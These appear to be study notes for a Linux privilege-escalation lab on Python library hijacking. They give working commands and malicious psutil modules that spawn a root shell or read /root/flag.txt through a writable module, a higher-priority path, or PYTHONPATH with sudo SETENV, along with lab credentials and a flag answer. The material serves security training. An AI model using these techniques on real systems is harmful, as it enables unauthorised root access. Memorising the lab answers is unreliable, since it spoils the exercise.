# Section 22 — Python Library Hijacking

## ID
220

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 22 — Python Library Hijacking

## Description
Escalating privileges by hijacking Python module imports through three vectors: writable module files, writable higher-priority library paths, and the PYTHONPATH environment variable with SETENV sudo permissions.

## Tags
python, library-hijacking, pythonpath, suid, sudo, privesc

## Commands
- `sudo -l`
- `python3 -c 'import sys; print("\n".join(sys.path))'`
- `pip3 show <MODULE>`
- `grep -r "def <FUNCTION>" /usr/local/lib/python3.8/dist-packages/<MODULE>/`
- `ls -l /usr/local/lib/python3.8/dist-packages/<MODULE>/__init__.py`
- `sudo /usr/bin/python3 <SCRIPT>.py`
- `sudo PYTHONPATH=/tmp/ /usr/bin/python3 <SCRIPT>.py`

## What This Section Covers
Python imports modules from a prioritized list of paths. If an attacker can write to a module's source file, place a malicious module in a higher-priority path, or control the PYTHONPATH environment variable via sudo SETENV, they can hijack the import to execute arbitrary code as root. Three distinct attack vectors exist depending on the misconfiguration present.

## Methodology

### Method 1 — Writable Module File
1. Find a SUID Python script or one runnable via `sudo`: check with `ls -la` and `sudo -l`
2. Read the script to identify which module and function it imports (e.g. `import psutil` → `virtual_memory()`)
3. Locate the module source: `grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/`
4. Check if the module file is writable: `ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py`
5. Edit the function to inject code: add `import os; os.system('/bin/bash')` at the top of the target function
6. Run the script with elevated privileges: `sudo /usr/bin/python3 /home/htb-student/mem_status.py`

### Method 2 — Library Path Hijacking
1. List Python's module search order: `python3 -c 'import sys; print("\n".join(sys.path))'`
2. Find the target module's install location: `pip3 show psutil` → e.g. `/usr/local/lib/python3.8/dist-packages`
3. Check if any higher-priority path is writable: `ls -la /usr/lib/python3.8`
4. Create a malicious module with the same name in the writable higher-priority path (e.g. `/usr/lib/python3.8/psutil.py`)
5. The malicious module must implement the same function name the script calls
6. Run the script — Python finds your module first

### Method 3 — PYTHONPATH Environment Variable
1. Check `sudo -l` for `SETENV` flag (allows setting env vars with sudo)
2. Create a malicious module in `/tmp/` with the target module name (e.g. `/tmp/psutil.py`)
3. Run: `sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py`
4. Python searches `/tmp/` first, loads your malicious module

## Multi-step Workflow (optional)
```
# Method 1 — Edit writable module directly
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# Add at top of virtual_memory(): import os; os.system('cat /root/flag.txt')
sudo /usr/bin/python3 /home/htb-student/mem_status.py

# Method 2 — Higher-priority path
python3 -c 'import sys; print("\n".join(sys.path))'
ls -la /usr/lib/python3.8   # check if writable
cat << 'EOF' > /usr/lib/python3.8/psutil.py
import os
def virtual_memory():
    os.system('/bin/bash')
EOF
sudo /usr/bin/python3 mem_status.py

# Method 3 — PYTHONPATH with SETENV
cat << 'EOF' > /tmp/psutil.py
import os
def virtual_memory():
    os.system('/bin/bash')
EOF
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — flag.txt under root | `HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}` | Method 1 — edited writable psutil/__init__.py, injected os.system into virtual_memory() |

#### Lab Walkthrough
Target: Ubuntu 20.04.3 LTS, Kernel 5.4.0-88-generic. Creds: `htb-student:HTB_@cademy_stdnt!`

```bash
ssh htb-student@<TARGET_IP>

# Enumerate
ls -la mem_status.py
cat mem_status.py           # imports psutil → virtual_memory()
sudo -l                     # (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

# Find and check module permissions
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--r-- 1 htb-student staff → WRITABLE by us

# Inject into virtual_memory() function
vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# Add these two lines at the top of def virtual_memory():
#     import os
#     os.system('cat /root/flag.txt')

# Execute
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```

## Key Takeaways
- Three distinct vectors: writable module source, writable higher-priority path, PYTHONPATH via SETENV — check all three during enumeration
- Python's module search order is the core concept: `python3 -c 'import sys; print("\n".join(sys.path))'` — higher paths win
- `SETENV` in `sudo -l` output is the indicator for the PYTHONPATH method — it allows setting environment variables through sudo
- The malicious module must match the exact module name AND implement the same function name with the correct argument count
- Method 1 (writable module) is the most direct; Method 3 (PYTHONPATH) is the cleanest since it doesn't modify system files
- `pip3 show <module>` reveals install location — cross-reference with `sys.path` to identify if a higher-priority writable path exists

## Gotchas
- The sudo rule must specify the full path to the script (`/usr/bin/python3 /home/htb-student/mem_status.py`) — you must run it exactly as listed
- When creating a fake module, it must have the same filename as the import (e.g. `psutil.py` for `import psutil`)
- The hijacked function won't return properly — the script may error after your payload runs (e.g. `AttributeError: 'NoneType'`), but the code still executes as root
- Don't forget to restore the original module after exploitation if you're editing it in place (Method 1)
- Method 2 requires a writable directory that appears ABOVE the real module's path in `sys.path` — same level or below won't work
